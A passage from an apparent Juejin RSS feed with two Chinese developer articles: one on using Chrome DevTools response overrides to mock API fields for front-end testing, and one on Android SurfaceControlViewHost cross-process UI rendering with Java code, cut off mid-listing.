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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>老板：小王啊，你 bug 率也太高了，得想想办法，不然扣你绩效。
小王眼里闪过一分无奈二分心酸三分苦涩四分身不由己，很多条件 case、边缘 case 都不好触发，很难自测充分，比如：</p>
<ul>
<li>新手引导，标识由后端下发，申请个新账号非常麻烦</li>
<li>各类状态的流转，比如 xx 任务失败，但是大多数情况下都走不到失败路线</li>
<li>余额为 0 的情况下的各种 case，测试账号往往都是拉满的余额</li>
<li>vip 与普通用户的各种差异点</li>
</ul>
<p>对这类的情况，就只能盲写，然后手动在代码里改状态来大致看一下效果，就很难模拟出一个完整的流程，会出 bug 也属实正常。</p>
<p>有心急的同学就要说了，mock 呀，用 mock 呀！</p>
<p>话虽如此，但是要使用这一套，一是你需要起服务/开程序、写数据、运行，这一套下来还是比较费时间的。二是此类问题绵绵无绝期，每次都这么搞，时间成本会无限累加。</p>
<p>而且频繁调试往往会弄脏代码，很容易提交上一些调试数据，有没有更简单好用的方案呢？</p>
<p>有的有的（掏出 chrome），这么简单的方案还有一个，那就是我们常打交道的控制台了。</p>
<h2 data-id="heading-1">chrome 之替换</h2>
<p>这里举个实际例子带大家走一遍，比如我是掘金的前端，我想测试一下文章<strong>审核中</strong>的样式</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a4208ee424d4a6d9f34ec4d219657ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=bsPP2tCMunltvJ9bVrceIFZ91C4%3D" alt="image.png" loading="lazy"/></p>
<p>但是总不能回回都重新写一个审核中的文章供自己测试，费时费力。已知审核中的状态由后端 <code>dynamic</code> 接口的 <code>audit_status</code>决定，该状态为 1 时会展示审核中，为 0 时是正常。</p>
<p>先看一下最终实现的效果吧，只需要简单的操作就可以开闭 mock，而且不侵入代码：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af229bbdedac4b569af5c0022b072034~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=F3px88llUPNi5OSGy9fJSsRemYo%3D" alt="20251121172420_rec_.gif" loading="lazy"/></p>
<p>OK，再说下详细使用步骤：</p>
<ol>
<li>在网络中找到目标接口
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c700ca4a136b48948efe5e20270cda42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=uvE5BnXYd3aCHH4LrZ83MbcuOQU%3D" alt="image.png" loading="lazy"/></li>
<li>右键进行替换
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/267d38f35f7d47a9a4b87fff14401abc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=DuDOgdR4K0IrlBDUNlSxP7b9k7k%3D" alt="image.png" loading="lazy"/></li>
<li>如果是首次使用，会有个提示，需要你选择一个文件夹来存放数据
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47999f2a2e7c4a0fb37405527d037a91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=TdQw5CLefKLlRQIFQk2lblbIEWU%3D" alt="image.png" loading="lazy"/></li>
<li>此时会进入到替换的编辑页，该页面可能为刚才请求的内容，也有时候为空。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8c23b06a1154fb7a261644d0a59b8e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=vSjFXByznn%2F1qFpmd6mvjMRAfRo%3D" alt="image.png" loading="lazy"/>
如果为空的话，可以先去刚才的响应里复制，再贴过来
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d18e0b123084d109e2ece1e98c90716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=qUhMRh0QZWhnQq0lqvLdCsmz4ow%3D" alt="image.png" loading="lazy"/></li>
<li>接着就可以自行修改响应的内容了：这里我们把<code>audit_status</code>从0改为1
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2e7d38c18f2484c885522087c6567e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=zcFKFJVp%2BhGsDyy4gDNVEZdY%2FOc%3D" alt="image.png" loading="lazy"/></li>
<li>ctrl s 保存后，刷新页面即可看到效果
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76949dd8c9f84a788d85e302467ba645~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaW1vbw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835790&amp;x-signature=K%2B9ivq1QlM1WL%2FDu4yqtzg3g24I%3D" alt="image.png" loading="lazy"/></li>
</ol>
<p>大功告成，虽然看起来步骤很多，但大多数情况下实际上<strong>只需要右键替换，编辑保存两步就完事了</strong>，既方便启用，又不侵入代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SurfaceControlViewHost 实现跨进程UI渲染]]></title>    <link>https://juejin.cn/post/7577016562252595251</link>    <guid>https://juejin.cn/post/7577016562252595251</guid>    <pubDate>2025-11-27T08:06:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577016562252595251" data-draft-id="7576929700842881033" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SurfaceControlViewHost 实现跨进程UI渲染"/> <meta itemprop="keywords" content="Android,设计"/> <meta itemprop="datePublished" content="2025-11-27T08:06:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="菜就多学"/> <meta itemprop="url" content="https://juejin.cn/user/2663485744614969"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SurfaceControlViewHost 实现跨进程UI渲染
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2663485744614969/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    菜就多学
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T08:06:52.000Z" title="Thu Nov 27 2025 08:06:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>在学习photo picker文档时，看到了这样一个描述；可以通过一种方法，将另一个进程的复杂页面渲染到当前页面中，并支持做复杂交互，且具备一定的安全性和隐私性保护。结合之前项目上的一个诉求（给第三方业务暴露登陆按钮，但不想让业务方得知实现细节，避免业务方后台调用该按钮后台偷偷登陆）感觉可以用这种方式去实现，因此去了解下细节</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50a3246520b04957b446dedec0536922~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I-c5bCx5aSa5a2m:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835611&amp;x-signature=owV9h84ninqTt1Gjs33ljEHLISU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">实现效果</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/342a89d800f1480a8b468617d4823ebc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I-c5bCx5aSa5a2m:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835611&amp;x-signature=wqrFWlcwTi%2FRsV3u80GNSO5%2BbRI%3D" alt="等.gif" loading="lazy"/></p>
<h2 data-id="heading-2">实现方式：</h2>
<p>1、使用<strong>SurfaceControlViewHost + SurfaceView 实现</strong></p>
<p><strong>SurfaceView原理：</strong> 核心是把主进程的surface传递给单独的渲染进程，从而实现跨进程渲染的效果</p>
<p><strong>SurfaceControlViewHost：</strong> 并提供将渲染进程的view嵌入到主进程中</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4ba132b918a4535851d47cfa2415b0d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I-c5bCx5aSa5a2m:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835611&amp;x-signature=Btw7PslBogzrrjx4g%2BX7jKdgJ2I%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f2fbf0d10344e60aef0adaf72f600c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I-c5bCx5aSa5a2m:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835611&amp;x-signature=P89LIe7AATJsaCkao8Ol%2FNWFkQ4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-3">使用步骤</h2>
<p>客户端（主进程）：</p>
<p>--创建用于展示内容的，surfaceView，提供host token确定是具体哪个surface View，提供display ID，用于渲染的一些基础依赖（字体大小等）</p>
<p>--获取服务端返回的SurfacePackage，与surfaceView绑定</p>
<p>--事件通知，所有input事件，通知服务器</p>
<p>服务端（渲染进程）：</p>
<p>--使用客户端提供的display ID、hostToken 创建SurfaceControlViewHost，创建自定义view，返回SurfacePackage给客户端</p>
<p>--接收input事件，传递给自定义view</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2e3415585a04e6f8ec7a2beb5d35029~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I-c5bCx5aSa5a2m:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764835611&amp;x-signature=R2DUcRKqcMra8sMrksr2e%2B9qrc0%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//aidl</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteRender</span> {
    <span class="hljs-comment">//客户端提供surface、大小、display 从服务端获取 surfacePackage</span>
    SurfacePackage <span class="hljs-title function_">getSurfacePackage</span><span class="hljs-params">(<span class="hljs-type">int</span> displayId, IBinder hostToken, <span class="hljs-type">int</span> width, <span class="hljs-type">int</span> height)</span>;
    <span class="hljs-comment">//客户端向服务端传递 事件</span>
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">onTouch</span><span class="hljs-params">(in MotionEvent motionEvent)</span>;
}
 
<span class="hljs-comment">//服务端</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> IRemoteRender.<span class="hljs-type">Stub</span> <span class="hljs-variable">mBinder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IRemoteRender</span>.Stub() {
 
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> SurfaceControlViewHost.SurfacePackage <span class="hljs-title function_">getSurfacePackage</span><span class="hljs-params">(<span class="hljs-type">int</span> displayId, IBinder hostToken, <span class="hljs-type">int</span> width, <span class="hljs-type">int</span> height)</span> {
            Log.i(TAG, <span class="hljs-string">"getSurfacePackage, displayId="</span> + displayId + <span class="hljs-string">", hostToken="</span> + hostToken + <span class="hljs-string">", width="</span> + width + <span class="hljs-string">", height="</span> + height);
            <span class="hljs-keyword">final</span> SurfaceControlViewHost.SurfacePackage[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SurfaceControlViewHost</span>.SurfacePackage[<span class="hljs-number">1</span>];
            <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
            mHandler.post(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
                <span class="hljs-meta">@Override</span>
                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                    <span class="hljs-comment">// 创建SurfaceControlViewHost</span>
                    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> getBaseContext();
                    <span class="hljs-type">Display</span> <span class="hljs-variable">display</span> <span class="hljs-operator">=</span> context.getSystemService(DisplayManager.class).getDisplay(displayId);
                    mSurfaceControlViewHost = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SurfaceControlViewHost</span>(context, display, hostToken);
                    createRootView(width,height);
                    <span class="hljs-comment">// 将视图附加到SurfaceControlViewHost</span>
                    mSurfaceControlViewHost.setView(mRootView, width, height);
                    result[<span class="hljs-number">0</span>] = mSurfaceControlViewHost.getSurfacePackage();
                    latch.countDown();
                }
            });
 
            <span class="hljs-keyword">try</span> {
                latch.await(); <span class="hljs-comment">// 等待主线程完成操作</span>
                <span class="hljs-keyword">return</span> result[<span class="hljs-number">0</span>];
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Log.i(TAG, <span class="hljs-string">"getSurfacePackage, e="</span> + e.getMessage());
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
 
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onTouch</span><span class="hljs-params">(MotionEvent event)</span> <span class="hljs-keyword">throws</span> RemoteException {
            <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1</span>);
            <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span>[] result = {<span class="hljs-literal">true</span>};
            mHandler.post(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
                <span class="hljs-meta">@Override</span>
                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                    mRootView.dispatchTouchEvent(event);
                    latch.countDown();
                }
            });
            <span class="hljs-keyword">try</span> {
                latch.await(); <span class="hljs-comment">// 等待主线程完成操作</span>
                <span class="hljs-keyword">return</span> result[<span class="hljs-number">0</span>];
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                Log.i(TAG, <span class="hljs-string">"getSurfacePackage, e="</span> + e.getMessage());
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    };
 
 
<span class="hljs-comment">//客户端</span>
      <span class="hljs-keyword">try</span> {
            <span class="hljs-type">IBinder</span> <span class="hljs-variable">hostToken</span> <span class="hljs-operator">=</span> mSurfaceView.getHostToken();
            SurfaceControlViewHost.<span class="hljs-type">SurfacePackage</span> <span class="hljs-variable">surfacePackage</span> <span class="hljs-operator">=</span> mRemoteRender.getSurfacePackage(<span class="hljs-number">0</span>, hostToken, <span class="hljs-number">1000</span>, <span class="hljs-number">2000</span>);
            mSurfaceView.setChildSurfacePackage(surfacePackage);
            mSurfaceView.setOnTouchListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnTouchListener() {
                <span class="hljs-meta">@Override</span>
                <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onTouch</span><span class="hljs-params">(View view, MotionEvent motionEvent)</span> {
 
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">return</span> mRemoteRender.onTouch(motionEvent);
                    } <span class="hljs-keyword">catch</span> (RemoteException e) {
